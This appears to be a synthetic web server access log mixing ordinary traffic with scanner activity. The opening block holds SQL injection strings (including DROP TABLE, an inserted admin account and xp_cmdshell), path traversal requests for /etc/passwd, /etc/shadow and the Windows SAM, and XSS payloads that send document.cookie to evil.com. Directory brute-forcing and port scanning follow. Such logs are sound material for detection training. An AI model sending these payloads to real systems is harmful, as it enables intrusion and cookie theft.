91.108.4.1 - - [15/Jan/2024:15:07:00 +0000] "GET /login?user=admin'%20OR%201=1-- HTTP/1.1" 500 1520 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:02 +0000] "GET /search?q=SELECT%20*%20FROM%20users HTTP/1.1" 200 1558 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:03 +0000] "GET /user?id=1%20UNION%20SELECT%201,2,3-- HTTP/1.1" 500 556 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:05 +0000] "GET /page?id=1'%20AND%201=1-- HTTP/1.1" 200 1173 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:06 +0000] "GET /api/data?sort=name;DROP%20TABLE%20users HTTP/1.1" 500 1936 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:07 +0000] "GET /product?id=1%20OR%201=1 HTTP/1.1" 200 1120 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:08 +0000] "GET /category?name=test'%20UNION%20SELECT%20password%20FROM%20users-- HTTP/1.1" 500 654 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:10 +0000] "GET /filter?type=1;INSERT%20INTO%20admin(user,pass)%20VALUES('hack','hack') HTTP/1.1" 500 2034 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:11 +0000] "GET /view?file=1'%20OR%20'1'='1 HTTP/1.1" 500 1497 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:12 +0000] "GET /download?path=xp_cmdshell('dir') HTTP/1.1" 500 508 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:13 +0000] "GET /query?search=admin'--%20 HTTP/1.1" 500 1528 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:15 +0000] "GET /list?order=name%20UNION%20SELECT%20*%20FROM%20information_schema.tables-- HTTP/1.1" 500 663 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:16 +0000] "GET /../../etc/passwd HTTP/1.1" 403 287 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:17 +0000] "GET /../../../etc/shadow HTTP/1.1" 403 287 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:18 +0000] "GET /....//....//etc/passwd HTTP/1.1" 403 287 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:19 +0000] "GET /%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1" 403 287 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:20 +0000] "GET /..\..\windows\system32\config\sam HTTP/1.1" 403 287 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:21 +0000] "GET /static/../../../etc/hosts HTTP/1.1" 403 287 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:23 +0000] "GET /images/../../config/database.yml HTTP/1.1" 403 287 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:23 +0000] "GET /download?file=../../../etc/passwd HTTP/1.1" 403 287 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:24 +0000] "GET /page?xss=<script>alert(1)</script> HTTP/1.1" 200 512 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:25 +0000] "GET /search?q=<img%20onerror=alert(1)> HTTP/1.1" 200 512 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:26 +0000] "GET /comment?body=javascript:alert(document.cookie) HTTP/1.1" 200 512 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:28 +0000] "GET /profile?name=<script>document.location='http://evil.com?c='+document.cookie</script> HTTP/1.1" 200 512 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:29 +0000] "GET /form?input=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1" 200 512 "-" "sqlmap/1.7"
91.108.4.1 - - [15/Jan/2024:15:07:30 +0000] "GET /api?callback=<script>fetch('http://evil.com/'+document.cookie)</script> HTTP/1.1" 200 512 "-" "sqlmap/1.7"
117.26.247.55 - - [15/Jan/2024:16:15:01 +0000] "GET /admin HTTP/1.1" 403 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:02 +0000] "GET /admin/login HTTP/1.1" 403 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:03 +0000] "GET /admin/dashboard HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:03 +0000] "GET /wp-admin HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:04 +0000] "GET /wp-login.php HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:05 +0000] "GET /phpmyadmin HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:06 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:07 +0000] "GET /manager HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:08 +0000] "GET /manager/html HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:09 +0000] "GET /console HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:10 +0000] "GET /actuator HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:11 +0000] "GET /actuator/env HTTP/1.1" 403 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:12 +0000] "GET /actuator/health HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:13 +0000] "GET /api/admin HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:14 +0000] "GET /api/admin/users HTTP/1.1" 403 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:15 +0000] "GET /.env HTTP/1.1" 403 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:16 +0000] "GET /.env.production HTTP/1.1" 403 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:17 +0000] "GET /config HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:18 +0000] "GET /config.php HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:19 +0000] "GET /backup HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:20 +0000] "GET /backup.sql HTTP/1.1" 403 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:21 +0000] "GET /shell HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:22 +0000] "GET /cmd HTTP/1.1" 403 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:23 +0000] "GET /exec HTTP/1.1" 404 287 "-" "gobuster/3.5"
117.26.247.55 - - [15/Jan/2024:16:15:25 +0000] "GET /etc/passwd HTTP/1.1" 403 287 "-" "gobuster/3.5"
94.102.49.88 - - [15/Jan/2024:17:00:00 +0000] "GET /port-4013 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:00 +0000] "GET /port-8139 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:01 +0000] "GET /port-1519 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:01 +0000] "GET /port-2568 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:02 +0000] "GET /port-3363 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:02 +0000] "GET /port-6503 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:03 +0000] "GET /port-4655 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:03 +0000] "GET /port-3176 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:04 +0000] "GET /port-1427 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:04 +0000] "GET /port-5952 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:05 +0000] "GET /port-6259 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:06 +0000] "GET /port-7032 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:06 +0000] "GET /port-8248 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:06 +0000] "GET /port-3974 HTTP/1.1" 404 287 "-" "masscan/1.3"
94.102.49.88 - - [15/Jan/2024:17:00:07 +0000] "GET /port-1525 HTTP/1.1" 404 287 "-" "masscan/1.3"
192.168.2.200 - - [15/Jan/2024:18:00:03 +0000] "GET /api/v1/orders HTTP/1.1" 200 7197 "https://example.com" "axios/1.4.0"
192.168.1.100 - - [15/Jan/2024:18:00:14 +0000] "GET /news HTTP/1.1" 200 3402 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.2.200 - - [15/Jan/2024:18:00:28 +0000] "POST / HTTP/1.1" 200 5031 "https://example.com" "axios/1.4.0"
172.16.0.50 - - [15/Jan/2024:18:00:36 +0000] "GET /about.html HTTP/1.1" 200 3744 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.2.200 - - [15/Jan/2024:18:00:40 +0000] "GET /search HTTP/1.1" 200 10075 "https://example.com" "axios/1.4.0"
192.168.1.5 - frank [15/Jan/2024:18:00:44 +0000] "GET / HTTP/1.1" 200 10352 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
172.16.0.50 - - [15/Jan/2024:18:00:45 +0000] "GET /search HTTP/1.1" 200 15224 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.1.100 - - [15/Jan/2024:18:00:52 +0000] "GET /shop/item/3 HTTP/1.1" 200 10492 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.1.10 - alice [15/Jan/2024:18:01:01 +0000] "POST /blog HTTP/1.1" 200 5381 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.2.200 - - [15/Jan/2024:18:01:05 +0000] "GET /shop/item/2 HTTP/1.1" 200 4200 "https://example.com" "axios/1.4.0"
10.20.30.40 - - [15/Jan/2024:18:01:18 +0000] "GET /shop/item/1 HTTP/1.1" 200 5246 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
172.16.0.50 - - [15/Jan/2024:18:01:24 +0000] "POST /js/app.js HTTP/1.1" 200 9933 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.16.1.25 - - [15/Jan/2024:18:01:38 +0000] "POST /shop/cart HTTP/1.1" 200 5399 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.1.100 - - [15/Jan/2024:18:01:50 +0000] "GET /shop/checkout HTTP/1.1" 200 15582 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.3.75 - bob [15/Jan/2024:18:02:01 +0000] "GET /shop HTTP/1.1" 200 15351 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.2.200 - - [15/Jan/2024:18:02:06 +0000] "GET /js/app.js HTTP/1.1" 200 12027 "https://example.com" "axios/1.4.0"
10.20.30.40 - - [15/Jan/2024:18:02:10 +0000] "GET /blog/post/1 HTTP/1.1" 200 4341 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.100 - - [15/Jan/2024:18:02:25 +0000] "GET /contact HTTP/1.1" 200 4763 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.3.75 - bob [15/Jan/2024:18:02:36 +0000] "GET /about.html HTTP/1.1" 200 12828 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.1.5 - frank [15/Jan/2024:18:02:49 +0000] "GET /shop HTTP/1.1" 200 10540 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
10.0.0.10 - - [15/Jan/2024:18:03:00 +0000] "GET /products HTTP/1.1" 200 7720 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.2.200 - - [15/Jan/2024:18:03:14 +0000] "GET /search HTTP/1.1" 200 6391 "https://example.com" "axios/1.4.0"
10.0.0.10 - - [15/Jan/2024:18:03:22 +0000] "POST /contact HTTP/1.1" 200 10710 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.2.200 - - [15/Jan/2024:18:03:34 +0000] "GET /dashboard HTTP/1.1" 200 3155 "https://example.com" "axios/1.4.0"
192.168.1.5 - frank [15/Jan/2024:18:03:38 +0000] "GET /home HTTP/1.1" 200 2308 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
172.16.0.50 - - [15/Jan/2024:18:03:47 +0000] "GET /home/profile HTTP/1.1" 200 6523 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
10.0.1.15 - - [15/Jan/2024:18:03:55 +0000] "POST /shop/item/2 HTTP/1.1" 200 773 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.3.75 - bob [15/Jan/2024:18:03:59 +0000] "GET / HTTP/1.1" 200 15654 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.1.5 - frank [15/Jan/2024:18:04:14 +0000] "GET /settings HTTP/1.1" 200 11837 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
10.0.0.10 - - [15/Jan/2024:18:04:27 +0000] "POST /css/style.css HTTP/1.1" 200 1003 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
10.20.30.40 - - [15/Jan/2024:18:04:33 +0000] "GET /settings HTTP/1.1" 200 12314 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
172.16.0.50 - - [15/Jan/2024:18:04:34 +0000] "GET /sitemap.xml HTTP/1.1" 200 4494 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.1.5 - frank [15/Jan/2024:18:04:41 +0000] "GET /index.html HTTP/1.1" 200 10762 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.10 - alice [15/Jan/2024:18:04:49 +0000] "GET /blog/post/3 HTTP/1.1" 200 5872 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
172.16.1.25 - - [15/Jan/2024:18:05:04 +0000] "POST /products HTTP/1.1" 200 1888 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.3.75 - bob [15/Jan/2024:18:05:19 +0000] "GET /api/data HTTP/1.1" 200 10080 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.3.75 - bob [15/Jan/2024:18:05:20 +0000] "POST /sitemap.xml HTTP/1.1" 200 5096 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.16.0.50 - - [15/Jan/2024:18:05:26 +0000] "GET /about.html HTTP/1.1" 200 840 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.16.1.25 - - [15/Jan/2024:18:05:33 +0000] "GET /index.html HTTP/1.1" 200 10657 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
10.20.30.40 - - [15/Jan/2024:18:05:37 +0000] "GET /api/v1/orders HTTP/1.1" 200 452 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.20.30.40 - - [15/Jan/2024:18:05:51 +0000] "GET /api/health HTTP/1.1" 200 13798 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.2.200 - - [15/Jan/2024:18:05:56 +0000] "GET /home HTTP/1.1" 200 1973 "https://example.com" "axios/1.4.0"
10.0.1.15 - - [15/Jan/2024:18:06:00 +0000] "GET /api/v1/users HTTP/1.1" 200 12917 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
172.16.0.50 - - [15/Jan/2024:18:06:03 +0000] "GET /profile HTTP/1.1" 200 9971 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
10.20.30.40 - - [15/Jan/2024:18:06:15 +0000] "GET /faq HTTP/1.1" 200 13633 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.3.75 - bob [15/Jan/2024:18:06:22 +0000] "GET /search HTTP/1.1" 200 8288 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.16.1.25 - - [15/Jan/2024:18:06:26 +0000] "GET /search HTTP/1.1" 200 12082 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.2.200 - - [15/Jan/2024:18:06:31 +0000] "GET /profile HTTP/1.1" 200 5357 "https://example.com" "axios/1.4.0"
10.0.1.15 - - [15/Jan/2024:18:06:42 +0000] "GET /api/health HTTP/1.1" 200 7546 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
172.16.0.50 - - [15/Jan/2024:18:06:50 +0000] "GET /api/data HTTP/1.1" 200 12509 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.16.0.50 - - [15/Jan/2024:18:07:04 +0000] "GET /api/data HTTP/1.1" 200 2859 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.16.0.50 - - [15/Jan/2024:18:07:07 +0000] "GET /shop/cart HTTP/1.1" 200 9330 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.3.75 - bob [15/Jan/2024:18:07:10 +0000] "GET /search HTTP/1.1" 200 9671 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.3.75 - bob [15/Jan/2024:18:07:25 +0000] "GET /profile HTTP/1.1" 200 13305 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.3.75 - bob [15/Jan/2024:18:07:35 +0000] "GET /dashboard HTTP/1.1" 200 4108 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
10.0.0.10 - - [15/Jan/2024:18:07:50 +0000] "POST /faq HTTP/1.1" 200 14842 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
10.0.0.10 - - [15/Jan/2024:18:07:52 +0000] "POST /css/style.css HTTP/1.1" 200 10732 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.2.200 - - [15/Jan/2024:18:07:58 +0000] "GET /sitemap.xml HTTP/1.1" 200 1518 "https://example.com" "axios/1.4.0"
192.168.1.100 - - [15/Jan/2024:18:08:01 +0000] "GET /blog HTTP/1.1" 200 16322 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.1.10 - alice [15/Jan/2024:18:08:11 +0000] "GET /news HTTP/1.1" 200 4846 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.3.75 - bob [15/Jan/2024:18:08:19 +0000] "GET /profile HTTP/1.1" 200 10770 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
10.20.30.40 - - [15/Jan/2024:18:08:27 +0000] "GET /home HTTP/1.1" 200 3902 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
172.16.0.50 - - [15/Jan/2024:18:08:42 +0000] "GET /api/v1/users HTTP/1.1" 200 7292 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.16.0.50 - - [15/Jan/2024:18:08:50 +0000] "GET /js/app.js HTTP/1.1" 200 10463 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.1.10 - alice [15/Jan/2024:18:08:51 +0000] "POST /home HTTP/1.1" 200 6111 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.2.200 - - [15/Jan/2024:18:09:00 +0000] "POST /about.html HTTP/1.1" 200 13096 "https://example.com" "axios/1.4.0"
10.0.1.15 - - [15/Jan/2024:18:09:05 +0000] "GET /blog/post/2 HTTP/1.1" 200 272 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.1.10 - alice [15/Jan/2024:18:09:11 +0000] "POST /shop/item/1 HTTP/1.1" 200 13088 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
10.0.1.15 - - [15/Jan/2024:18:09:14 +0000] "GET /faq HTTP/1.1" 200 3692 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
10.0.0.10 - - [15/Jan/2024:18:09:27 +0000] "GET /api/v1/orders HTTP/1.1" 200 8648 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
10.0.0.10 - - [15/Jan/2024:18:09:41 +0000] "GET /faq HTTP/1.1" 200 7948 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.5 - frank [15/Jan/2024:18:09:55 +0000] "GET /home HTTP/1.1" 200 6084 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.5 - frank [15/Jan/2024:18:10:04 +0000] "GET /shop/item/2 HTTP/1.1" 200 11822 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
172.16.0.50 - - [15/Jan/2024:18:10:05 +0000] "POST /shop/item/3 HTTP/1.1" 200 8851 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.16.1.25 - - [15/Jan/2024:18:10:20 +0000] "POST /shop/checkout HTTP/1.1" 200 8691 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.16.1.25 - - [15/Jan/2024:18:10:25 +0000] "POST /blog/post/2 HTTP/1.1" 200 13795 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.1.10 - alice [15/Jan/2024:18:10:37 +0000] "GET /blog HTTP/1.1" 200 13364 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.3.75 - bob [15/Jan/2024:18:10:47 +0000] "GET /shop/item/3 HTTP/1.1" 200 2128 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
10.0.1.15 - - [15/Jan/2024:18:11:00 +0000] "POST /shop/checkout HTTP/1.1" 200 2614 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
10.0.0.10 - - [15/Jan/2024:18:11:03 +0000] "GET /search HTTP/1.1" 200 7623 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.2.200 - - [15/Jan/2024:18:11:06 +0000] "GET /blog/post/3 HTTP/1.1" 200 2879 "https://example.com" "axios/1.4.0"
10.0.1.15 - - [15/Jan/2024:18:11:14 +0000] "GET /shop/cart HTTP/1.1" 200 7175 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.1.100 - - [15/Jan/2024:18:11:28 +0000] "GET /shop/checkout HTTP/1.1" 200 6994 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.1.10 - alice [15/Jan/2024:18:11:40 +0000] "GET /js/app.js HTTP/1.1" 200 6368 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.10 - alice [15/Jan/2024:18:11:53 +0000] "GET /images/logo.png HTTP/1.1" 200 6306 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
10.0.0.10 - - [15/Jan/2024:18:12:00 +0000] "GET /blog/post/3 HTTP/1.1" 200 10539 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
172.16.0.50 - - [15/Jan/2024:18:12:12 +0000] "POST /products HTTP/1.1" 200 15149 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.16.1.25 - - [15/Jan/2024:18:12:13 +0000] "GET /js/app.js HTTP/1.1" 200 1548 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
10.0.0.10 - - [15/Jan/2024:18:12:23 +0000] "POST /index.html HTTP/1.1" 200 906 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.10 - alice [15/Jan/2024:18:12:34 +0000] "GET /products HTTP/1.1" 200 6100 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
